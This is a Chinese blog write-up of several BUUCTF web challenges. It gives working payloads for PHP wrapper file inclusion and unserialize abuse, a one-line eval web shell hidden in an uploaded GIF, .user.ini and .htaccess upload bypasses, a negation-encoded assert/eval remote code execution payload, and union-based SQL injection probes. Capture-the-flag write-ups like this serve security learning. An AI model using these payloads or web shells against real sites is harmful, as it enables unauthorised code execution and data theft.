<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>第一个</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)<span class="comment">//r为读取权限</span></span><br></pre></td></tr></table></figure></div>

<p>file_get_contents()函数是将文件内容读取到变量，而这里是从变量读取，读取text变量的值，这里需要text变量为<code>welcome to the zjctf</code></p>
<p>但是因为可能存在对变量的正则匹配，过滤，一般是用base64绕过</p>
<p>这里就可以利用两个伪协议，php://input和data://，这两个一个是读取post数据，一个是读取get数据，这里用data://协议</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure></div>

<p>当然这里不用base64也可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br></pre></td></tr></table></figure></div>

<p>第二个</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br></pre></td></tr></table></figure></div>

<p>一个文件包含，尝试用php://filter读取<code>useless.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">&amp;file=php:<span class="regexp">//</span>filter<span class="regexp">/read=conver.base64-encode/</span>resource=useless.php</span><br></pre></td></tr></table></figure></div>

<p>至于password，猜测应该是在useless.php里才有线索，先赋值1看看</p>
<p>于是先构造一个payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">?text=data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=useless.php&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>得到<code>useless.php</code>内容</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823175723137.png" alt="image-20220823175723137"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br><span class="line"></span><br><span class="line">解码后</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>再看看password变量</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure></div>
<p>这里用了反序列化，所以password就是序列化后的值</p>
<p>利用<code>useless.php</code>构造序列化</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span> ;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>运行后        </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure></div>

<p>最后payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//仔细一下会注意到这里的file的值中，伪协议删除了，</span><br><span class="line">这是因为开始默认都是<span class="keyword">index</span>.php，但是<span class="keyword">index</span>.php没有Flag类，</span><br><span class="line">如果想执行反序列化，那就需要包含Flag类，也就是这里的useless.php里的</span><br><span class="line">所以这里删除file里的伪协议，只留useless.php的文件名</span><br><span class="line">就是利用  <span class="keyword">include</span>($file); </span><br><span class="line">把useless.php包含在<span class="keyword">index</span>.php里，从而可以成功执行反序列化，得到flag</span><br></pre></td></tr></table></figure></div>

<p>得到flag</p>
<h2 id="9-SUCTF-2019-CheckIn"><a href="#9-SUCTF-2019-CheckIn" class="headerlink" title="9.[SUCTF 2019]CheckIn"></a>9.[SUCTF 2019]CheckIn</h2><h3 id="1-题目描述-6"><a href="#1-题目描述-6" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>先上传一个文本文件试试</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825173012665.png" alt="image-20220825173012665"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">exif_imagetype是判断一个图像的类型的进程。</span><br></pre></td></tr></table></figure>

<p>所以只能上传图片</p>
<p>先上传一个包含PHP木马的图片马试试</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825174837632.png" alt="image-20220825174837632"></p>
<p>看来是过滤了<code>&lt;?</code>，所以除了php,其他的asp,aspx,jsp,js都可以绕过</p>
<p>这里以js举例</p>
<p>创建一个js文件，内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>在和一个普通图片合成，也可以加个文件头GIF89a</p>
<p>图片马名为<code>haha.gif</code></p>
<p>然后上传</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825210858681.png" alt="image-20220825210858681"></p>
<p>由于不是php木马，所以无法用<code>.htaccess</code>文件绕过</p>
<p>这里就需要用<code>.user.ini</code>配置文件,当然使用前提是<code>.user.ini</code>文件下有php文件，不然也不能包含了</p>
<p>推荐看一下这篇<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure></div>

<p>所以这里设置自动包含的文件为<code>haha.gif</code></p>
<p>于是<code>.user.ini</code>内容为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a       <span class="comment">//绕过图片判断         </span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=haha.gif</span><br></pre></td></tr></table></figure></div>

<p>上传<code>.user.ini</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825214029074.png" alt="image-20220825214029074"></p>
<p>这个时候haha.gif就已经包含在index.php，可以访问</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">9</span>c7a4b64-<span class="number">1</span>c49-<span class="number">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class="number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure></div>

<p>能看到<code>GIF98a?</code></p>
<p>然后也可以用hackbar，post上传命令，如图中的phpinfo()</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215617387.png" alt="image-20220825215617387"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(scandir(<span class="string">&quot;/&quot;</span>))<span class="comment">;//看看根目录，找到flag</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220825220933577.png" alt="image-20220825220933577"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>))<span class="comment">;//读取flag文件</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220825221229971.png" alt="image-20220825221229971"></p>
<hr>
<p>当然用蚁剑最简单，连接也成功</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825214728996.png" alt="image-20220825214728996"></p>
<p>可以看到<strong>index.php文件也在上传的目录</strong>下，也就是<code>.user.ini</code>的同一个目录下，所以才可以成功包含</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215454619.png" alt="image-20220825215454619"></p>
<p>在根目录发现了flag，打开即可得到flag</p>
<hr>
<p>但我发现根目录一个clean.sh文件，这是一个定时清空linux服务器上缓存的文件脚本，上传的文件会被定时删除</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215047906.png" alt="image-20220825215047906"></p>
<p>这是一分钟左右后，靶场环境还在但是无法访问了，所以要快点拿取flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215220524.png" alt="image-20220825215220524"></p>
<p>这里本来想删掉clean.sh，发现没权限，无法执行，sudo也不行，那就只能速战速决了</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825220024393.png" alt="image-20220825220024393"></p>
<p>根目录得到flag</p>
<h2 id="10-GXYCTF2019-BabyUpload"><a href="#10-GXYCTF2019-BabyUpload" class="headerlink" title="10.[GXYCTF2019]BabyUpload"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id="1-题目描述-7"><a href="#1-题目描述-7" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>这道题不难，但是开始不清楚还是不知道过滤了什么，</p>
<p>这道题介绍几个点就可以了</p>
<p>第一个是过滤了后缀名含ph</p>
<p>第二也是关键的，它只允许上传<code>content-type: image/jpeg</code>，png和gif都不可以</p>
<p>第三点就是它过滤了文件内容里含<code>&lt;?</code></p>
<p>所以上传一个jpeg文件，抓包修改内容为非php但包含php的一个脚本，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSP"><figure class="iseeu highlight /jsp"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>再上传.htaccess文件，解析所有文件为php</p>
<p>用蚁剑连接jpeg文件，即可</p>
<h2 id="11-极客大挑战-2019-RCE-ME"><a href="#11-极客大挑战-2019-RCE-ME" class="headerlink" title="11.[极客大挑战 2019]RCE ME"></a>11.[极客大挑战 2019]RCE ME</h2><h3 id="1-题目描述-8"><a href="#1-题目描述-8" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>先对代码分析</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>可以看到code被正则匹配，所以字母大小写和数字都不能输入</p>
<p>这里就学到新东西了</p>
<p><strong>取反绕过</strong></p>
<p><u><strong>取反</strong>就是将数字转化为二进制,再把二进制中的1变成0,0变成1</u></p>
<p><code>~</code>是取反符号，</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//php断言：assert — 检查一个断言是否为 false，如果参数是字符串，它将会被 assert() 当做 PHP 代码来执行</span></span><br></pre></td></tr></table></figure></div>

<p>然后再赋值</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意后面要有；，代表php代码结束</span></span><br><span class="line"><span class="comment">//这里~是取反，之前urlencode里取反了一次，赋值时再取反一次，相当于没有取反</span></span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line"></span><br><span class="line">?code=(assert)(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">(assert)因为是assert是函数，被当作函数执行，于是因为断言(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]))，所以把<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>])当作php执行，于是就可以拿到shell了</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">蚁剑连接</span><br><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></div>

<p>但是发现flag是空的</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181221552.png" alt="image-20220903181221552"></p>
<p>看了其他大佬的wp才知道，需要蚁剑插件<code>disable_functions</code>，禁止网站的函数，防止其阻止读取flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181348649.png" alt="image-20220903181348649"></p>
<p>再在主页右键</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181431745.png" alt="image-20220903181431745"></p>
<p>模式选择</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181451266.png" alt="image-20220903181451266"></p>
<p>然后点击开始</p>
<p>终端输入</p>
<p><code>/readflag</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220903181528195.png" alt="image-20220903181528195"></p>
<p>得到flag</p>
<h2 id="12-GXYCTF2019-BabySQli"><a href="#12-GXYCTF2019-BabySQli" class="headerlink" title="12.[GXYCTF2019]BabySQli"></a>12.[GXYCTF2019]BabySQli</h2><h3 id="1-题目描述-9"><a href="#1-题目描述-9" class="headerlink" title="1)题目描述"></a>1)题目描述</h3><p>无</p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p>开始是一个登录框</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909203922998.png" alt="image-20220909203922998"></p>
<p>我们随便输入一个账号密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NSIS"><figure class="iseeu highlight /nsis"><table><tr><td class="code"><pre><span class="line">账号：<span class="literal">admin</span></span><br><span class="line">密码：<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909204018695.png" alt="image-20220909204018695"></p>
<p>报错，看来用户名没错，密码错误</p>
<p>查看源码看看</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204046072.png" alt="image-20220909204046072"></p>
<p>发现有一串加密字符，看起来像base</p>
<p>先用<code>base32</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204202994.png" alt="image-20220909204202994"></p>
<p>看起来就是<code>base32+base64</code>混合编码，再用<code>base64</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204325138.png" alt="image-20220909204325138"></p>
<hr>
<p>当然看不出来，直接无脑<code>ciphey</code>，也可以，当然还是需要了解不同编码和加密字符的特点</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909204746167.png" alt="image-20220909204746167"></p>
<p>也可以得到解码结果</p>
<hr>
<p>由</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可知，sql注入点在Username处，且为单引号闭合</p>
<p>于是我们尝构造注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>and%<span class="number">201</span>=<span class="number">1</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909205630033.png" alt="image-20220909205630033"></p>
<p>发现有的字符被过滤了，我们可以用fuzz爆破测试看看，也可以一个一个试</p>
<p>我这里先爆破试试（建议爆破还是慢一些，后面直接太多请求，服务器不发返回包了）</p>
<p>大概统计一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">or</span><br><span class="line">()</span><br><span class="line"><span class="operator">=</span></span><br></pre></td></tr></table></figure></div>

<p>所以我们只有先试试联合注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AXAPTA"><figure class="iseeu highlight /axapta"><table><tr><td class="code"><pre><span class="line">由于过滤了or</span><br><span class="line">所以我们不能使用<span class="keyword">order</span> <span class="keyword">by</span>来判断列数，可以用联合注入，利用<span class="keyword">select</span>的结果来判断</span><br></pre></td></tr></table></figure></div>

<p>先试试<code>select 1,2</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909214254664.png" alt="image-20220909214254664"></p>
<p>发现报错，列数有问题</p>
<p>再试试<code>select 1,2,3</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">name</span>=admin&#x27;%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>#&amp;pw=<span class="number">123456</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220909214345515.png" alt="image-20220909214345515"></p>
<p>发现虽然没有报错，但是也没有直接回显</p>
<p>再试试<code>select 1,2,3,4</code></p>
<p>又报错</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220909214506605.png" alt="image-20220909214506605"></p>
<p><strong>所以得出<code>列数一共有3列</code></strong></p>
<p><strong>根据经验这三列，分别是</strong><u><strong>id,username,password</strong></u></p>
<p>我们可以用以下语句进行确认</p>
